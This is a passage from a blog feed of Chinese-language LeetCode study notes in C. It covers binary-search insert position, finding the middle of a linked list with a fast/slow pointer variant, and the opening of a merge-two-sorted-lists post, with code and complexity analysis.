class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">searchInsert</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> nums[<span class="number">2</span>]= &#123;<span class="number">1</span>,<span class="number">3</span>&#125;;</span><br><span class="line">    <span class="type">int</span> target = <span class="number">3</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Middle:%d\n&quot;</span>, searchInsert(nums, <span class="number">2</span>, target));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">searchInsert</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span>&#123;</span><br><span class="line">    <span class="type">int</span> right, left, mid;</span><br><span class="line">    right = numsSize<span class="number">-1</span>;</span><br><span class="line">    left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt; right)&#123;   </span><br><span class="line">        mid = left + (right - left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[mid])&#123;     </span><br><span class="line">            right = mid; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[mid])&#123; </span><br><span class="line">            left = mid+<span class="number">1</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (left == right)&#123; </span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[left])&#123;                </span><br><span class="line">            mid= left;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[left])&#123;  </span><br><span class="line">            mid= left+<span class="number">1</span>;    </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            mid = left;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> mid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/35/results.png"></p><h2 id="修正程式碼"><a href="#修正程式碼" class="headerlink" title="修正程式碼"></a>修正程式碼</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">searchInsert</span><span class="params">(<span class="type">int</span>* nums, <span class="type">int</span> numsSize, <span class="type">int</span> target)</span> &#123;</span><br><span class="line">    <span class="type">int</span> right, left, mid;</span><br><span class="line">    right = numsSize<span class="number">-1</span>;  </span><br><span class="line">    left = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span>(left &lt;= right)&#123;</span><br><span class="line">        mid = left + (right - left)/<span class="number">2</span>;</span><br><span class="line">        <span class="keyword">if</span> (target &lt; nums[mid])&#123;     </span><br><span class="line">            right = mid<span class="number">-1</span>; </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (target &gt; nums[mid])&#123;</span><br><span class="line">            left = mid+<span class="number">1</span>;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> mid;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> left;</span><br></pre></td></tr></table></figure><blockquote><p><code>left = right</code> 其實也不用單獨出來處理，只要當 <code>target &lt; nums[mid]</code> 時再取 right 的時候取小一些，並且在 <code>left &gt; right</code> 也就是找不到值的時候，回傳 <code>left</code> 則會是最適合插入的位置</p></blockquote><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/35/results2.png"></p><blockquote><p>好像執行時間沒比較快，哈</p></blockquote><h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><h3 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h3><p>這段程式碼的主要結構是一個 while 迴圈，迴圈內部實現了二元搜索。它的特點是每次迴圈都將搜索範圍縮小一半，因此其時間複雜度是 $O(log n)$，其中 <code>n</code> 是陣列的大小 <code>numsSize</code>。</p><p>初始化操作是 $O(1)$。<br>while 迴圈中的每一次迭代，<strong>搜索範圍減少一半。這意味著迴圈最多運行 $log(n)$ 次</strong><br>在每次迭代中，所有操作（如計算 mid、比較、賦值等）都是 $O(1)$<br>因此，整體時間複雜度為 $O(log n)$</p><h3 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h3><p>這段程式碼使用了一些額外的變量來儲存索引和中間結果，但這些變量的數量與輸入陣列的大小無關，都是常數數量的額外空間。</p><p>變數 <code>right</code>、<code>left</code>、<code>mid</code> 和 <code>target</code> 都是固定數量的整數變量。<br>程式碼中沒有使用任何額外的數組或動態分配的空間。<br>因此，整體空間複雜度為 $O(1)$</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> C </tag>
            
            <tag> Binary Search </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>找到鏈結串列的中間節點 | Easy |LeetCode#876 Middle of the Linked List</title>
      <link href="/posts/the_middle_of_the_list.html"/>
      <url>/posts/the_middle_of_the_list.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/876/question1.png"><br><img src="/img/LeetCode/876/question2.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目敘述: 給定一個 single linked list 的 <code>head</code> 並且希望回傳 list 的中間節點，若中間節點有兩個，需要回傳第二個</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p><img src="/img/LeetCode/876/algo.png"></p><ol><li>定義節點結構</li><li>建立 linked list</li><li>呼叫函數 <code>middleNode()</code></li></ol><p>在 <code>middleNode</code> 內:</p><ol><li>Traverse list，才有辦法知道中間節點，在 traverse過程透過一個counter來紀錄數量</li><li>判斷當前節點數量是奇數還是偶數，取得中間節點的 index </li><li>接著重新走訪到 middleNode，並回傳節點</li></ol><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">middleNode</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">current</span> =</span> head;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">middle</span>=</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> counter=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> middleNodeIndex;</span><br><span class="line">    <span class="type">bool</span> isEven;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span>(counter%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            isEven = <span class="literal">true</span>;</span><br><span class="line">            middleNodeIndex = counter/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            isEven = <span class="literal">false</span>;</span><br><span class="line">            middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// Traverse to the middle node, and return middle node</span></span><br><span class="line">    current = head;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;counter; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( i == middleNodeIndex)&#123;</span><br><span class="line">            middle = current;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> middle;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h3 id="說明"><a href="#說明" class="headerlink" title="說明"></a>說明</h3><ul><li>初始化變數:<ul><li><code>current</code> 用於遍歷鏈結串列，<code>middle</code> 用於儲存中間節點，<code>counter</code> 用於計算節點總數，<code>middleNodeIndex</code> 用於儲存中間節點的索引，<code>isEven</code> 用於判斷節點數是否為偶數</li></ul></li><li>計算list 長度跟中間索引:<ul><li>每走到一個節點就判斷基數偶數，並計算中間節點</li></ul></li><li>之後重新初始化 <code>current</code> 指標並traverse 到 <code>middleNodeIndex</code>的節點</li><li>返回中間節點</li></ul><h3 id="完整測試程式碼"><a href="#完整測試程式碼" class="headerlink" title="完整測試程式碼"></a>完整測試程式碼</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> val;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">node</span>* <span class="title">next</span>;</span></span><br><span class="line">&#125; Node;</span><br><span class="line"></span><br><span class="line">Node *first, *current, *previous;</span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node *first)</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node *first)</span>;</span><br><span class="line">Node * <span class="title function_">middleNode</span><span class="params">(Node *first)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create a 3-nodes linked list</span></span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>( i=<span class="number">0</span>; i&lt;<span class="number">4</span>; i++) &#123;</span><br><span class="line">        Node *current = (Node*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Node));</span><br><span class="line">        <span class="keyword">if</span> (i==<span class="number">0</span>)&#123;</span><br><span class="line">            current-&gt;val = <span class="number">7</span>;</span><br><span class="line">            first = current;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">1</span>)&#123;</span><br><span class="line">            current-&gt;val = <span class="number">2</span>;</span><br><span class="line">            previous-&gt;next = current;</span><br><span class="line">            current-&gt;next =<span class="literal">NULL</span>;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (i==<span class="number">2</span>)&#123;</span><br><span class="line">            current-&gt;val = <span class="number">3</span>;</span><br><span class="line">            previous-&gt;next = current;</span><br><span class="line">            current-&gt;next =<span class="literal">NULL</span>;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            current-&gt;val = <span class="number">9</span>;</span><br><span class="line">            previous-&gt;next = current;</span><br><span class="line">            current-&gt;next =<span class="literal">NULL</span>;</span><br><span class="line">            previous = current;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    PrintList(first);</span><br><span class="line">    Node *mid = middleNode(first);</span><br><span class="line">    <span class="keyword">if</span> (mid != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Middle Node: %d \n&quot;</span>, mid-&gt;val);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;No middle node found.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    FreeList(first);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">PrintList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node * ptr = first;</span><br><span class="line">    <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;empty list\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">while</span> ( ptr != <span class="literal">NULL</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d -&gt;&quot;</span>, ptr-&gt;val);</span><br><span class="line">            ptr = ptr -&gt; next;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;NULL\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">FreeList</span><span class="params">(Node* first)</span>&#123;</span><br><span class="line">    Node *tmp, *current;</span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">while</span>(current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        tmp = current;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        <span class="built_in">free</span>(tmp);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Node * <span class="title function_">middleNode</span><span class="params">(Node *first)</span>&#123;</span><br><span class="line">    Node *current = first;</span><br><span class="line">    Node *middle= <span class="literal">NULL</span>;</span><br><span class="line">    <span class="type">int</span> counter=<span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> middleNodeIndex;</span><br><span class="line">    <span class="type">bool</span> isEven;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span>(counter%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            isEven = <span class="literal">true</span>;</span><br><span class="line">            middleNodeIndex = counter/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            isEven = <span class="literal">false</span>;</span><br><span class="line">            middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    current = first;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>; i&lt;counter; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span> ( i == middleNodeIndex)&#123;</span><br><span class="line">            middle = current;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> middle;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/876/results1.png"></p><blockquote><p>大概執行時間是 3ms，並不太算是效能良好的寫法<br>空間也用的挺多，5.66MB</p></blockquote><h2 id="修正程式碼"><a href="#修正程式碼" class="headerlink" title="修正程式碼"></a>修正程式碼</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        <span class="keyword">if</span>(counter%<span class="number">2</span> == <span class="number">0</span>)&#123;</span><br><span class="line">            isEven = <span class="literal">true</span>;</span><br><span class="line">            middleNodeIndex = counter/<span class="number">2</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            isEven = <span class="literal">false</span>;</span><br><span class="line">            middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>上面這段程式碼有些冗，因為題目要求多個中間節點時，取第二個節點就好，因此奇偶數不用分開處理，可以改成下面</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// (1) Get the length of list (2) Get the index of the middle</span></span><br><span class="line">    <span class="keyword">while</span> (current != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        counter++;</span><br><span class="line">        middleNodeIndex = (<span class="type">int</span>)(<span class="built_in">floor</span>(counter/<span class="number">2</span>));</span><br><span class="line">        current = current-&gt;next;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>執行結果也會大幅提升</p><p><img src="/img/LeetCode/876/results3.png"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><p>在解答區看到一個寫得很讚的作法，他的想法是:</p><ol><li>想像你跟你朋友正要爬樓梯</li><li>你們都站在樓梯底部</li><li>你每次爬一階，而你朋友每次爬兩階 (你的平均上樓速度會是你朋友的一半)</li><li>當他爬到頂端，你就停下 (恰好會待在樓梯的一半位置)</li></ol><h3 id="步驟"><a href="#步驟" class="headerlink" title="步驟"></a>步驟</h3><p><img src="/img/LeetCode/876/algo2.png"></p><ol><li><strong>Initialization:</strong> Start with two pointers, fast and slow, both pointing to the head of the list.</li><li><strong>Traversal:</strong> Move the fast pointer two steps at a time and the slow pointer one step at a time. This ensures that when the fast pointer reaches the end of the list, the slow pointer will be at the middle node.</li><li><strong>Find the Middle Node:</strong> After traversal, the slow pointer will be at the middle node of the list.</li><li><strong>Edge Case Handling:</strong> Check if the list is empty or contains only one node. In such cases, the middle node is the head itself.</li><li><strong>Return:</strong> Return the node pointed to by the slow pointer as the middle node.</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     struct ListNode *next;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">struct</span> ListNode* <span class="title function_">middleNode</span><span class="params">(<span class="keyword">struct</span> ListNode* head)</span> &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ListNode</span> *<span class="title">fast_ptr</span>, *<span class="title">slw_ptr</span>;</span></span><br><span class="line">    fast_ptr = head;</span><br><span class="line">    slw_ptr = head;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (fast_ptr != <span class="literal">NULL</span> &amp;&amp; fast_ptr-&gt;next != <span class="literal">NULL</span>)&#123;</span><br><span class="line">        fast_ptr = fast_ptr-&gt;next-&gt;next;</span><br><span class="line">        slw_ptr = slw_ptr-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>  slw_ptr;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/876/results2.png"></p><h2 id="複雜度分析"><a href="#複雜度分析" class="headerlink" title="複雜度分析"></a>複雜度分析</h2><h3 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h3><ul><li>在走訪整個 list 的時候間複雜度是 $O(N)$，N 為節點數量</li><li>接著在找尋中間節點時間複雜度同樣是 $O(N)$</li><li>整體而言，<code>middleNode</code> 函式的時間複雜度式 $O(N)+ O(N) &#x3D; O(N)$</li></ul><h3 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h3><p>空間消耗</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct ListNode *current = head;</span><br><span class="line">struct ListNode *middle = NULL;</span><br><span class="line">int counter = 0;</span><br><span class="line">int middleNodeIndex;</span><br><span class="line">bool isEven;</span><br></pre></td></tr></table></figure><ul><li>為常數空間，因此這裡空間複雜度會是 $O(1)$</li><li>並且沒有使用額外的資料結構，所以整體而言空間複雜度也是 $O(1)$</li></ul>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> Easy </tag>
            
            <tag> Linked List </tag>
            
            <tag> C </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>合併鏈結串列 | Easy | LeetCode#21 Merge Two Sorted Lists</title>
      <link href="/posts/8b576379.html"/>
      <url>/posts/8b576379.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/21/question1.png"><br><img src="/img/LeetCode/21/question2.png"></p><ul><li>題目難度: <code>Easy</code></li><li>題目描述: 給定兩個已排序 linked list 的 <code>head</code>，希望能夠合併成一個已排序的list</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p><img src="/img/LeetCode/21/algo.jpg"></p><p>一開始我想說可以先走訪 <code>list1</code> 然後逐項比對 <code>list2</code> 的item，如果 <code>list1</code>中的元素小於 <code>list2</code> 的，就插入到 <code>list2</code>，並且插入後，再繼續迭代 <code>list1</code>當中的元素</p><p>原始代碼：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span 